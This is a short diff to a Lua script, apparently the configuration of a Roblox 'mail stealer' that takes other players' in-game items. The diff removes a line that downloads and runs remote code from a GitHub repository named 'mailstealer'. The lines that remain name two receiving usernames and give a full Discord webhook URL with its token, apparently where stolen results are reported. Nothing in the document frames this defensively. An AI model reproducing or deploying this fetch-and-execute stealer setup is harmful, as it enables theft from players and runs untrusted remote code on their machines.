@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HubScript/mailstealer/main/spacemail.lua"))()
 Username = "eko_hi"
 Username2 = "eko_hi1" 
 Webhook = "https://discord.com/api/webhooks/1236012282996326460/HVGy0Ui3XbJVn_d_lVuucqrRO32U3qQG0h7MBPdMgpKAb9Ubi_hteNfaQ6WbKkAfo9vh"
